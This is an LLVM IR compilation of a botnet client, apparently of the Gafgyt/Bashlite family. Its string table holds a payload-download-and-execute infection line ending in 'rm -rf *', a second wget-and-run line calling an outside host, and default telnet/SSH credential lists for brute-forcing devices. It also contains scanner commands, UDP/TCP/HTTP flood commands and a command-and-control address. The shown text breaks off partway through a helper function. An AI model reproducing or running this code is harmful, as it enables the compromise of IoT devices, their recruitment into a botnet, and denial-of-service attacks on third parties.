; ModuleID = 'client.c'
source_filename = "client.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, %struct._IO_codecvt*, %struct._IO_wide_data*, %struct._IO_FILE*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type opaque
%struct._IO_codecvt = type opaque
%struct._IO_wide_data = type opaque
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i32, i16, i8* }
%struct.telstate_t.1 = type { i32, i32, i8, i8, i8, i8, i32, i16, i8* }
%struct.udphdr = type { %union.anon.2 }
%union.anon.2 = type { %struct.anon.3 }
%struct.anon.3 = type { i16, i16, i16, i16 }
%struct.anon.4 = type { i16, i16, i16, i16 }
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.ifreq = type { %union.anon.5, %union.anon.6 }
%union.anon.5 = type { [16 x i8] }
%union.anon.6 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@.str = private unnamed_addr constant [375 x i8] c"cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://0.0.0.0/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; tftp 0.0.0.0 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 0.0.0.0; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 0.0.0.0 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf gtop.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\0D\0A\00", align 1
@infectline = dso_local global i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i32 0, i32 0), align 8
@.str.1 = private unnamed_addr constant [12 x i8] c"0.0.0.0:666\00", align 1
@commServer = dso_local global [1 x i8*] [i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.1, i32 0, i32 0)], align 8
@.str.2 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.3 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.4 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.5 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.6 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.7 = private unnamed_addr constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.8 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.9 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.10 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.11 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.12 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.13 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.14 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.15 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.16 = private unnamed_addr constant [139 x i8] c"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1\00", align 1
@.str.17 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.18 = private unnamed_addr constant [137 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.19 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.20 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.21 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.22 = private unnamed_addr constant [85 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6\00", align 1
@.str.23 = private unnamed_addr constant [128 x i8] c"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.24 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)\00", align 1
@useragents = dso_local global [23 x i8*] [i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([139 x i8], [139 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([137 x i8], [137 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.24, i32 0, i32 0)], align 16
@mainCommSock = dso_local global i32 0, align 4
@currentServer = dso_local global i32 -1, align 4
@gotIP = dso_local global i32 0, align 4
@numpids = dso_local global i64 0, align 8
@macAddress = dso_local global [6 x i8] zeroinitializer, align 1
@.str.25 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.26 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@.str.27 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.28 = private unnamed_addr constant [6 x i8] c"ubnt\00\00", align 1
@usernames = dso_local global [4 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.28, i32 0, i32 0)], align 16
@.str.29 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.30 = private unnamed_addr constant [7 x i8] c"vizxv\00\00", align 1
@.str.31 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.32 = private unnamed_addr constant [5 x i8] c"123\00\00", align 1
@.str.33 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.34 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.35 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.36 = private unnamed_addr constant [14 x i8] c"7ujMko0vizxv\00\00", align 1
@.str.37 = private unnamed_addr constant [10 x i8] c"dreambox\00\00", align 1
@passwords = dso_local global [13 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.27, i32 0, i32 0)], align 16
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.38 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.39 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.40 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.41 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.42 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.43 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.44 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@pids = dso_local global i32* null, align 8
@.str.45 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@ipState = internal global [5 x i8] zeroinitializer, align 1
@.str.46 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@ourIP = dso_local global %struct.in_addr zeroinitializer, align 4
@.str.47 = private unnamed_addr constant [14 x i8] c"gethostbyname\00", align 1
@.str.48 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.49 = private unnamed_addr constant [8 x i8] c"connect\00", align 1
@.str.50 = private unnamed_addr constant [8 x i8] c"0.0.0.0\00", align 1
@.str.51 = private unnamed_addr constant [14 x i8] c"GET gtop.sh\0D\0A\00", align 1
@.str.52 = private unnamed_addr constant [2 x i8] c"x\00", align 1
@.str.53 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.54 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.55 = private unnamed_addr constant [97 x i8] c"wget -q http://autoinstaller.us/NsfjSh -O .l; chmod +x .l; nohup ./.l </dev/null >/dev/null 2>&1\00", align 1
@.str.56 = private unnamed_addr constant [6 x i8] c"ogin:\00", align 1
@.str.57 = private unnamed_addr constant [9 x i8] c"assword:\00", align 1
@.str.58 = private unnamed_addr constant [6 x i8] c"user:\00", align 1
@.str.59 = private unnamed_addr constant [5 x i8] c"name\00", align 1
@.str.60 = private unnamed_addr constant [5 x i8] c"pass\00", align 1
@.str.61 = private unnamed_addr constant [5 x i8] c"word\00", align 1
@.str.62 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.63 = private unnamed_addr constant [8 x i8] c"invalid\00", align 1
@.str.64 = private unnamed_addr constant [10 x i8] c"incorrect\00", align 1
@.str.65 = private unnamed_addr constant [5 x i8] c"fail\00", align 1
@.str.66 = private unnamed_addr constant [6 x i8] c"again\00", align 1
@.str.67 = private unnamed_addr constant [6 x i8] c"wrong\00", align 1
@.str.68 = private unnamed_addr constant [13 x i8] c"accessdenied\00", align 1
@.str.69 = private unnamed_addr constant [7 x i8] c"denied\00", align 1
@.str.70 = private unnamed_addr constant [6 x i8] c"error\00", align 1
@.str.71 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@.str.72 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.73 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.74 = private unnamed_addr constant [16 x i8] c"REPORT %s:%s:%s\00", align 1
@.str.75 = private unnamed_addr constant [62 x i8] c"sh x;busybox chmod +x z | | chmod +x z;./z;rm -rf z;rm -f x\0D\0A\00", align 1
@.str.76 = private unnamed_addr constant [32 x i8] c"/bin/busybox;echo -e 'gayfgt'\0D\0A\00", align 1
@.str.77 = private unnamed_addr constant [10 x i8] c"ulti-call\00", align 1
@.str.78 = private unnamed_addr constant [11 x i8] c"multi-call\00", align 1
@.str.79 = private unnamed_addr constant [7 x i8] c"gayfgt\00", align 1
@.str.80 = private unnamed_addr constant [10 x i8] c"/bin/sh\0D\0A\00", align 1
@.str.81 = private unnamed_addr constant [4 x i8] c"dts\00", align 1
@.str.82 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.83 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.84 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.85 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.86 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.87 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.88 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.89 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.90 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.91 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.92 = private unnamed_addr constant [13 x i8] c"wget -s -U \22\00", align 1
@.str.93 = private unnamed_addr constant [6 x i8] c"\22 -q \00", align 1
@.str.94 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.95 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.96 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.97 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.98 = private unnamed_addr constant [39 x i8] c"SCANNER SSH/TELNET ON | SSH/TELNET OFF\00", align 1
@.str.99 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@scanPid = dso_local global i32 0, align 4
@.str.100 = private unnamed_addr constant [24 x i8] c"TELNET SCANNER STOPPED\0A\00", align 1
@.str.101 = private unnamed_addr constant [10 x i8] c"TELNET ON\00", align 1
@.str.102 = private unnamed_addr constant [25 x i8] c"TELNET SCANNER EXECUTED\0A\00", align 1
@.str.103 = private unnamed_addr constant [7 x i8] c"SSH ON\00", align 1
@.str.104 = private unnamed_addr constant [22 x i8] c"SSH SCANNER EXECUTED\0A\00", align 1
@.str.105 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.106 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.107 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.108 = private unnamed_addr constant [4 x i8] c"CNC\00", align 1
@.str.109 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.110 = private unnamed_addr constant [9 x i8] c"KILLATTK\00", align 1
@.str.111 = private unnamed_addr constant [10 x i8] c"LOLNOGTFO\00", align 1
@.str.112 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.113 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.114 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.115 = private unnamed_addr constant [7 x i8] c"DARKAI\00", align 1
@.str.116 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.117 = private unnamed_addr constant [10 x i8] c"BUILD %s\0A\00", align 1
@.str.118 = private unnamed_addr constant [13 x i8] c"fork failed\0A\00", align 1
@.str.119 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.120 = private unnamed_addr constant [9 x i8] c"BUILD %s\00", align 1
@.str.121 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.122 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.123 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.124 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.125 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.126 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.127 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @init_rand(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %10

10:                                               ; preds = %31, %1
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  br i1 %12, label %13, label %34

13:                                               ; preds = %10
  %14 = load i32, i32* %3, align 4
  %15 = sub nsw i32 %14, 3
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = load i32, i32* %3, align 4
  %20 = sub nsw i32 %19, 2
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = xor i32 %18, %23
  %25 = xor i32 %24, -1640531527
  %26 = load i32, i32* %3, align 4
  %27 = xor i32 %25, %26
  %28 = load i32, i32* %3, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  store i32 %27, i32* %30, align 4
  br label %31

31:                                               ; preds = %13
  %32 = load i32, i32* %3, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* %3, align 4
  br label %10, !llvm.loop !6

34:                                               ; preds = %10
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  %27 = load i32, i32* @c, align 4
  %28 = icmp ult i32 %26, %27
  br i1 %28, label %29, label %34

29:                                               ; preds = %0
  %30 = load i32, i32* %3, align 4
  %31 = add i32 %30, 1
  store i32 %31, i32* %3, align 4
  %32 = load i32, i32* @c, align 4
  %33 = add i32 %32, 1
  store i32 %33, i32* @c, align 4
  br label %34

34:                                               ; preds = %29, %0
  %35 = load i32, i32* %4, align 4
  %36 = load i32, i32* %3, align 4
  %37 = sub i32 %35, %36
  %38 = load i32, i32* @rand_cmwc.i, align 4
  %39 = zext i32 %38 to i64
  %40 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %39
  store i32 %37, i32* %40, align 4
  ret i32 %37
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @trim(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #11
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

10:                                               ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #11
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

19:                                               ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10, !llvm.loop !8

22:                                               ; preds = %10
  br label %23

23:                                               ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

27:                                               ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 %33) #11
  %35 = icmp ne i32 %34, 0
  br label %36

36:                                               ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

38:                                               ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23, !llvm.loop !9

41:                                               ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

43:                                               ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

47:                                               ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

59:                                               ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43, !llvm.loop !10

62:                                               ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
